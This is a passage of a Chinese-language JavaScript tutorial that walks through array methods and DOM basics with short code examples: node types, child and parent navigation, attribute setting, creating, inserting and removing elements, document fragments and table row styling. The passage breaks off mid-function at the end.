<li>unshift(元素)，从头部添加<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var arr=[1,2,3];</div><div class="line"></div><div class="line">arr.push(4); 	1,2,3,4</div><div class="line">//arr.ushift(4);   4,1,2,3</div><div class="line">alert(arr);</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><ul>
<li>pop()，从尾部弹出</li>
<li>shift()，从头部弹出</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var arr=[1,2,3];</div><div class="line"></div><div class="line">arr.pop();		1,2</div><div class="line">//arr.shift();  2,3   </div><div class="line">alert(arr);</div></pre></td></tr></table></figure>
<h4 id="插入、删除-splice"><a href="#插入、删除-splice" class="headerlink" title="插入、删除(splice)"></a>插入、删除(splice)</h4><ul>
<li><p>splice(开始, 长度,元素…)<br>先删除，后插入</p>
</li>
<li><p>splice(开始,长度)<br>删除</p>
</li>
<li><p>splice(开始, 0, 元素…)<br>插入</p>
</li>
<li><p>splice(开始，a,b1,b2..bn)   a=n<br>替换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">var arr=[1,2,3,4,5,6];</div><div class="line"></div><div class="line">arr.splice(2, 3);   // 1,2,6</div><div class="line"></div><div class="line">arr.splice(2, 0, &apos;a&apos;, &apos;b&apos;, &apos;c&apos;); // 1,a,b,c,2,3,4,5,6</div><div class="line"></div><div class="line">arr.splice(2, 2, &apos;a&apos;, &apos;b&apos;);   //  1,2,a,b,5,6</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="连接-concat-数组2"><a href="#连接-concat-数组2" class="headerlink" title="连接 concat(数组2)"></a>连接 concat(数组2)</h4><ul>
<li>连接两个数组<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var a=[1,2,3];</div><div class="line">var b=[4,5,6];</div><div class="line">a.concat(b);   // 1,2,3,4,5,6</div><div class="line">b.concat(a);   // 4,5,6,1,2,3</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="拼接-join-分隔符"><a href="#拼接-join-分隔符" class="headerlink" title="拼接 join(分隔符)"></a>拼接 join(分隔符)</h4><ul>
<li>用分隔符，组合数组元素，生成字符串</li>
<li>字符串split<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">var arr=[1,2,3,4];</div><div class="line">arr.join(&apos;-&apos;);    //1-2-3-4</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="排序-sort-比较函数"><a href="#排序-sort-比较函数" class="headerlink" title="排序 sort([比较函数])"></a>排序 sort([比较函数])</h4><p>sort([比较函数])，排序一个数组</p>
<ul>
<li>排序一个字符串数组</li>
<li><p>排序一个数字数组</p>
</li>
<li><p>排序一个字符串数组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var arr=[&apos;float&apos;, &apos;width&apos;, &apos;alpha&apos;, &apos;zoom&apos;, &apos;left&apos;];</div><div class="line"></div><div class="line">arr.sort();   //alpha,float,left,width,zoom</div></pre></td></tr></table></figure>
</li>
<li><p>排序一个数字数组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">var arr=[12, 8, 99, 19, 112];</div><div class="line"></div><div class="line">arr.sort(function (n1, n2)&#123;</div><div class="line">	return n1-n2;</div><div class="line">	/*if(n1&lt;n2)</div><div class="line">	&#123;</div><div class="line">		return -1;</div><div class="line">	&#125;</div><div class="line">	else if(n1&gt;n2)</div><div class="line">	&#123;</div><div class="line">		return 1;</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		return 0;</div><div class="line">	&#125;*/</div></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="DOM基础-1"><a href="#DOM基础-1" class="headerlink" title="DOM基础-1"></a>DOM基础-1</h1><p>DOM 是 W3C（万维网联盟）的标准。</p>
<p>DOM 定义了访问 HTML 和 XML 文档的标准：<br>“W3C 文档对象模型 （DOM） 是中立于平台和语言的接口，它允许程序和脚本动态地访问和更新文档的内容、结构和样式。”</p>
<p>W3C DOM 标准被分为 3 个不同的部分：</p>
<pre><code>核心 DOM - 针对任何结构化文档的标准模型
XML DOM - 针对 XML 文档的标准模型
HTML DOM - 针对 HTML 文档的标准模型
</code></pre><h2 id="DOM节点-1"><a href="#DOM节点-1" class="headerlink" title="DOM节点-1"></a>DOM节点-1</h2><p>根据 W3C 的 HTML DOM 标准，HTML 文档中的所有内容都是节点：</p>
<ul>
<li>整个文档是一个文档节点</li>
<li>每个 HTML 元素是元素节点</li>
<li>HTML 元素内的文本是文本节点</li>
<li>每个 HTML 属性是属性节点</li>
<li>注释是注释节点</li>
</ul>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>一些常用的 HTML DOM 方法：</p>
<ul>
<li>getElementById(id) - 获取带有指定 id 的节点（元素）</li>
<li>appendChild(node) - 插入新的子节点（元素）</li>
<li>removeChild(node) - 删除子节点（元素）</li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>getElementById()</td>
<td style="text-align:left">返回带有指定 ID 的元素。</td>
</tr>
<tr>
<td>getElementsByTagName()</td>
<td style="text-align:left">返回包含带有指定标签名称的所有元素的节点列表（集合/节点数组）。</td>
</tr>
<tr>
<td>getElementsByClassName()</td>
<td style="text-align:left">返回包含带有指定类名的所有元素的节点列表。</td>
</tr>
<tr>
<td>appendChild()</td>
<td style="text-align:left">把新的子节点添加到指定节点。</td>
</tr>
<tr>
<td>removeChild()</td>
<td style="text-align:left">删除子节点。</td>
</tr>
<tr>
<td>replaceChild()</td>
<td style="text-align:left">替换子节点。</td>
</tr>
<tr>
<td>insertBefore()</td>
<td style="text-align:left">在指定的子节点前面插入新的子节点。</td>
</tr>
<tr>
<td>createAttribute()</td>
<td style="text-align:left">创建属性节点。</td>
</tr>
<tr>
<td>createElement()</td>
<td style="text-align:left">创建元素节点。</td>
</tr>
<tr>
<td>createTextNode()</td>
<td style="text-align:left">创建文本节点。</td>
</tr>
<tr>
<td>getAttribute()</td>
<td style="text-align:left">返回指定的属性值。</td>
</tr>
<tr>
<td>setAttribute()</td>
<td style="text-align:left">把指定属性设置或修改为指定的值。</td>
</tr>
</tbody>
</table>
<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>属性是节点（HTML 元素）的值，您能够获取或设置。</p>
<h4 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h4><p>获取元素内容的最简单方法是使用 innerHTML 属性。</p>
<p>innerHTML 属性对于获取或替换 HTML 元素的内容很有用。</p>
<h4 id="nodeName"><a href="#nodeName" class="headerlink" title="nodeName"></a>nodeName</h4><p>nodeName 属性规定节点的名称。</p>
<ul>
<li>nodeName 是只读的</li>
<li>元素节点的 nodeName 与标签名相同</li>
<li>属性节点的 nodeName 与属性名相同</li>
<li>文本节点的 nodeName 始终是 ##text</li>
<li>文档节点的 nodeName 始终是 ##document</li>
</ul>
<p>注释：nodeName 始终包含 HTML 元素的大写字母标签名。</p>
<h4 id="nodeValue"><a href="#nodeValue" class="headerlink" title="nodeValue"></a>nodeValue</h4><p>nodeValue 属性规定节点的值。</p>
<ul>
<li>元素节点的 nodeValue 是 undefined 或 null</li>
<li>文本节点的 nodeValue 是文本本身</li>
<li>属性节点的 nodeValue 是属性值</li>
</ul>
<h4 id="nodeType"><a href="#nodeType" class="headerlink" title="nodeType"></a>nodeType</h4><p>nodeType 属性返回节点的类型。nodeType 是只读的。</p>
<p>比较重要的节点类型有：</p>
<table>
<thead>
<tr>
<th>元素类型</th>
<th style="text-align:left">NodeType</th>
</tr>
</thead>
<tbody>
<tr>
<td>元素</td>
<td style="text-align:left">1</td>
</tr>
<tr>
<td>属性</td>
<td style="text-align:left">2</td>
</tr>
<tr>
<td>文本</td>
<td style="text-align:left">3</td>
</tr>
<tr>
<td>注释</td>
<td style="text-align:left">8</td>
</tr>
<tr>
<td>文档</td>
<td style="text-align:left">9</td>
</tr>
</tbody>
</table>
<h1 id="DOM基础-2"><a href="#DOM基础-2" class="headerlink" title="DOM基础-2"></a>DOM基础-2</h1><h2 id="循环子节点"><a href="#循环子节点" class="headerlink" title="循环子节点"></a>循环子节点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">var oUl=document.getElementById(&apos;ul1&apos;);</div><div class="line"></div><div class="line">//IE6-8</div><div class="line">//alert(oUl.childNodes.length);</div><div class="line">for(var i=0;i&lt;oUl.childNodes.length;i++)</div><div class="line">&#123;</div><div class="line">	//nodeType==3	-&gt;	文本节点</div><div class="line">	//nodeType==1	-&gt;	元素节点</div><div class="line">	//alert(oUl.childNodes[i].nodeType);</div><div class="line">	</div><div class="line">	if(oUl.childNodes[i].nodeType==1)</div><div class="line">	&#123;</div><div class="line">		oUl.childNodes[i].style.background=&apos;red&apos;;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>兼容，不算文本节点，只算元素。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var oUl=document.getElementById(&apos;ul1&apos;);</div><div class="line"></div><div class="line">alert(oUl.children.length);</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="parentNode"><a href="#parentNode" class="headerlink" title="parentNode"></a>parentNode</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">	var oUl=document.getElementById(&apos;ul1&apos;);</div><div class="line"></div><div class="line">	alert(oUl.parentNode);</div><div class="line">	</div><div class="line">&lt;body&gt;</div><div class="line">&lt;ul id=&quot;ul1&quot;&gt;</div><div class="line">	&lt;li&gt;&lt;/li&gt;</div><div class="line">	&lt;li&gt;&lt;/li&gt;</div><div class="line">&lt;/ul&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
<h2 id="offsetParent"><a href="#offsetParent" class="headerlink" title="offsetParent"></a>offsetParent</h2><p>获取定位的父级</p>
<h2 id="首位子节点"><a href="#首位子节点" class="headerlink" title="首位子节点"></a>首位子节点</h2><h3 id="firstChild、lastChild"><a href="#firstChild、lastChild" class="headerlink" title="firstChild、lastChild"></a>firstChild、lastChild</h3><p>获取首位子节点（包括文本）</p>
<h3 id="firstElementChild-lastElementChild"><a href="#firstElementChild-lastElementChild" class="headerlink" title="firstElementChild lastElementChild"></a>firstElementChild lastElementChild</h3><p>获取首位元素</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">var oUl=document.getElementById(&apos;ul1&apos;);</div><div class="line"></div><div class="line">//IE6-8</div><div class="line">//oUl.firstChild.style.background=&apos;red&apos;;</div><div class="line"></div><div class="line">//高级浏览器</div><div class="line">//oUl.firstElementChild.style.background=&apos;red&apos;;</div><div class="line"></div><div class="line">if(oUl.firstElementChild)</div><div class="line">&#123;</div><div class="line">	oUl.firstElementChild.style.background=&apos;red&apos;;</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">	oUl.firstChild.style.background=&apos;red&apos;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="元素属性操作"><a href="#元素属性操作" class="headerlink" title="元素属性操作"></a>元素属性操作</h2><p>元素属性操作</p>
<ul>
<li>第一种：oDiv.style.display=“block”;</li>
<li>第二种：oDiv.style[“display”]=“block”;</li>
<li>第三种：Dom方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">var oTxt=document.getElementById(&apos;txt1&apos;);</div><div class="line">var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line"></div><div class="line">oBtn.onclick=function ()</div><div class="line">&#123;</div><div class="line">	//oTxt.value=&apos;asdfasd&apos;;</div><div class="line">	//oTxt[&apos;value&apos;]=&apos;xczcvb&apos;;</div><div class="line">	</div><div class="line">	oTxt.setAttribute(&apos;value&apos;, &apos;erwertwert&apos;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>DOM方式操作元素属性</p>
<ul>
<li>获取：getAttribute(名称)</li>
<li>设置：setAttribute(名称, 值)</li>
<li>删除：removeAttribute(名称)</li>
</ul>
<h2 id="DOM元素灵活查找"><a href="#DOM元素灵活查找" class="headerlink" title="DOM元素灵活查找"></a>DOM元素灵活查找</h2><h3 id="用className选择元素"><a href="#用className选择元素" class="headerlink" title="用className选择元素"></a>用className选择元素</h3><ul>
<li><p>如何用className选择元素<br>选出所有元素<br>通过className条件筛选</p>
</li>
<li><p>封装成函数</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">function getByClass(oParent, sClass)</div><div class="line">&#123;</div><div class="line">	var aResult=[];</div><div class="line">	var aEle=oParent.getElementsByTagName(&apos;*&apos;);  //通配符 所有标签</div><div class="line">	</div><div class="line">	for(var i=0;i&lt;aEle.length;i++)</div><div class="line">	&#123;</div><div class="line">		if(aEle[i].className==sClass)</div><div class="line">		&#123;</div><div class="line">			aResult.push(aEle[i]);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	return aResult;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="DOM操作应用"><a href="#DOM操作应用" class="headerlink" title="DOM操作应用"></a>DOM操作应用</h1><h2 id="创建、插入和删除元素"><a href="#创建、插入和删除元素" class="headerlink" title="创建、插入和删除元素"></a>创建、插入和删除元素</h2><h3 id="创建DOM元素"><a href="#创建DOM元素" class="headerlink" title="创建DOM元素"></a>创建DOM元素</h3><ul>
<li>createElement(标签名)        创建一个节点</li>
<li>appendChild(节点)            追加一个节点<br>例子：为ul插入li<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">function ()</div><div class="line">&#123;</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	var oUl=document.getElementById(&apos;ul1&apos;);</div><div class="line">	var oTxt=document.getElementById(&apos;txt1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		var oLi=document.createElement(&apos;li&apos;);</div><div class="line">		</div><div class="line">		oLi.innerHTML=oTxt.value;</div><div class="line">		</div><div class="line">		//父级.appendChild(子节点);</div><div class="line">		oUl.appendChild(oLi);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;input id=&quot;txt1&quot; type=&quot;text&quot;/&gt;</div><div class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;创建li&quot;/&gt;</div><div class="line">&lt;ul id=&quot;ul1&quot;&gt;</div><div class="line">&lt;/ul&gt;</div><div class="line"></div><div class="line">// 追加一个节点</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="插入元素"><a href="#插入元素" class="headerlink" title="插入元素"></a>插入元素</h3><ul>
<li>insertBefore(节点, 原有节点)    在已有元素前插入<br>例子：倒序插入li<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">function ()</div><div class="line">&#123;</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	var oUl=document.getElementById(&apos;ul1&apos;);</div><div class="line">	var oTxt=document.getElementById(&apos;txt1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		var oLi=document.createElement(&apos;li&apos;);</div><div class="line">		var aLi=oUl.getElementsByTagName(&apos;li&apos;);</div><div class="line">		</div><div class="line">		oLi.innerHTML=oTxt.value;</div><div class="line">		</div><div class="line">		//父级.appendChild(子节点);</div><div class="line">		//oUl.appendChild(oLi);</div><div class="line">		if(aLi.length&gt;0)         //判断是不是第一个节点</div><div class="line">		&#123;</div><div class="line">			oUl.insertBefore(oLi, aLi[0]);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			oUl.appendChild(oLi);</div><div class="line">		&#125;</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"></div><div class="line">&lt;input id=&quot;txt1&quot; type=&quot;text&quot;/&gt;</div><div class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;创建li&quot;/&gt;</div><div class="line">&lt;ul id=&quot;ul1&quot;&gt;</div><div class="line">&lt;/ul&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="删除DOM元素"><a href="#删除DOM元素" class="headerlink" title="删除DOM元素"></a>删除DOM元素</h3><ul>
<li>removeChild(节点)            删除一个节点<br>例子：删除li</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">function ()</div><div class="line">&#123;</div><div class="line">	var aA=document.getElementsByTagName(&apos;a&apos;);</div><div class="line">	var oUl=document.getElementById(&apos;ul1&apos;);</div><div class="line">	</div><div class="line">	for(var i=0;i&lt;aA.length;i++)</div><div class="line">	&#123;</div><div class="line">		aA[i].onclick=function ()</div><div class="line">		&#123;</div><div class="line">			oUl.removeChild(this.parentNode);</div><div class="line">		&#125;;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;ul id=&quot;ul1&quot;&gt;</div><div class="line">	&lt;li&gt;asfasd &lt;a href=&quot;javascript:;&quot;&gt;删除&lt;/a&gt;&lt;/li&gt;</div><div class="line">	&lt;li&gt;5645 &lt;a href=&quot;javascript:;&quot;&gt;删除&lt;/a&gt;&lt;/li&gt;</div><div class="line">	&lt;li&gt;ghdfjgj &lt;a href=&quot;javascript:;&quot;&gt;删除&lt;/a&gt;&lt;/li&gt;</div><div class="line">	&lt;li&gt;mvbnmvnb &lt;a href=&quot;javascript:;&quot;&gt;删除&lt;/a&gt;&lt;/li&gt;</div><div class="line">&lt;/ul&gt;</div></pre></td></tr></table></figure>
<h2 id="文档碎片"><a href="#文档碎片" class="headerlink" title="文档碎片"></a>文档碎片</h2><ul>
<li>仅在低级的浏览器上才能提高性能</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">function ()</div><div class="line">&#123;</div><div class="line">	var oUl=document.getElementById(&apos;ul1&apos;);</div><div class="line">	var oFrag=document.createDocumentFragment();  //创建一个文档碎片</div><div class="line">	</div><div class="line">	for(var i=0;i&lt;10000;i++)</div><div class="line">	&#123;</div><div class="line">		var oLi=document.createElement(&apos;li&apos;);</div><div class="line">		</div><div class="line">		oFrag.appendChild(oLi);</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	oUl.appendChild(oFrag);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;ul id=&quot;ul1&quot;&gt;</div><div class="line">&lt;/ul&gt;</div></pre></td></tr></table></figure>
<h1 id="DOM操作应用高级"><a href="#DOM操作应用高级" class="headerlink" title="DOM操作应用高级"></a>DOM操作应用高级</h1><h2 id="表格应用"><a href="#表格应用" class="headerlink" title="表格应用"></a>表格应用</h2><h3 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h3><p>tBodies、tHead、tFoot、rows、cells</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">function ()</div><div class="line">&#123;</div><div class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</div><div class="line">	</div><div class="line">	//alert(oTab.getElementsByTagName(&apos;tbody&apos;)[0].getElementsByTagName(&apos;tr&apos;)[1].getElementsByTagName(&apos;td&apos;)[1].innerHTML);</div><div class="line">	alert(oTab.tBodies[0].rows[1].cells[1].innerHTML);   </div><div class="line">&#125;;</div><div class="line"></div><div class="line"></div><div class="line">姓名：&lt;input id=&quot;name&quot; type=&quot;text&quot; /&gt;</div><div class="line">年龄：&lt;input id=&quot;age&quot; type=&quot;text&quot; /&gt;</div><div class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;添加&quot; /&gt;</div><div class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;搜索&quot; /&gt;</div><div class="line">&lt;table id=&quot;tab1&quot; border=&quot;1&quot; width=&quot;500&quot;&gt;</div><div class="line">	&lt;thead&gt;</div><div class="line">    	&lt;td&gt;ID&lt;/td&gt;</div><div class="line">    	&lt;td&gt;姓名&lt;/td&gt;</div><div class="line">    	&lt;td&gt;年龄&lt;/td&gt;</div><div class="line">        &lt;td&gt;操作&lt;/td&gt;</div><div class="line">    &lt;/thead&gt;</div><div class="line">    &lt;tbody&gt;</div><div class="line">    	&lt;tr&gt;</div><div class="line">        	&lt;td&gt;1&lt;/td&gt;</div><div class="line">        	&lt;td&gt;Blue&lt;/td&gt;</div><div class="line">        	&lt;td&gt;27&lt;/td&gt;</div><div class="line">        	&lt;td&gt;&lt;/td&gt;</div><div class="line">        &lt;/tr&gt;</div><div class="line">    	&lt;tr&gt;</div><div class="line">        	&lt;td&gt;2&lt;/td&gt;</div><div class="line">        	&lt;td&gt;张三&lt;/td&gt;</div><div class="line">        	&lt;td&gt;23&lt;/td&gt;</div><div class="line">        	&lt;td&gt;&lt;/td&gt;</div><div class="line">        &lt;/tr&gt;</div><div class="line">    	&lt;tr&gt;</div><div class="line">        	&lt;td&gt;3&lt;/td&gt;</div><div class="line">        	&lt;td&gt;李四&lt;/td&gt;</div><div class="line">        	&lt;td&gt;28&lt;/td&gt;</div><div class="line">        	&lt;td&gt;&lt;/td&gt;</div><div class="line">        &lt;/tr&gt;</div><div class="line">    	&lt;tr&gt;</div><div class="line">        	&lt;td&gt;4&lt;/td&gt;</div><div class="line">        	&lt;td&gt;王五&lt;/td&gt;</div><div class="line">        	&lt;td&gt;25&lt;/td&gt;</div><div class="line">        	&lt;td&gt;&lt;/td&gt;</div><div class="line">        &lt;/tr&gt;</div><div class="line">    	&lt;tr&gt;</div><div class="line">        	&lt;td&gt;5&lt;/td&gt;</div><div class="line">        	&lt;td&gt;张伟&lt;/td&gt;</div><div class="line">        	&lt;td&gt;24&lt;/td&gt;</div><div class="line">        	&lt;td&gt;&lt;/td&gt;</div><div class="line">        &lt;/tr&gt;</div><div class="line">    &lt;/tbody&gt;</div><div class="line">&lt;/table&gt;</div></pre></td></tr></table></figure>
<h3 id="隔行变色"><a href="#隔行变色" class="headerlink" title="隔行变色"></a>隔行变色</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">function ()</div><div class="line">&#123;</div><div class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</div><div class="line">	var oldColor=&apos;&apos;;  //定义变量保存原来的颜色</div><div class="line">	</div><div class="line">	for(var i=0;i&lt;oTab.tBodies[0].rows.length;i++)</div><div class="line">	&#123;</div><div class="line">		oTab.tBodies[0].rows[i].onmouseover=function ()</div><div class="line">		&#123;</div><div class="line">			oldColor=this.style.background;</div><div class="line">			this.style.background=&apos;green&apos;;</div><div class="line">		&#125;;</div><div class="line">		oTab.tBodies[0].rows[i].onmouseout=function ()</div><div class="line">		&#123;</div><div class="line">			this.style.background=oldColor;   </div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		if(i%2)</div><div class="line">		&#123;</div><div class="line">			oTab.tBodies[0].rows[i].style.background=&apos;&apos;;</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			oTab.tBodies[0].rows[i].style.background=&apos;#CCC&apos;;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="添加、删除一行"><a href="#添加、删除一行" class="headerlink" title="添加、删除一行"></a>添加、删除一行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">function ()</div><div class="line">&#123;</div><div class="line">	var 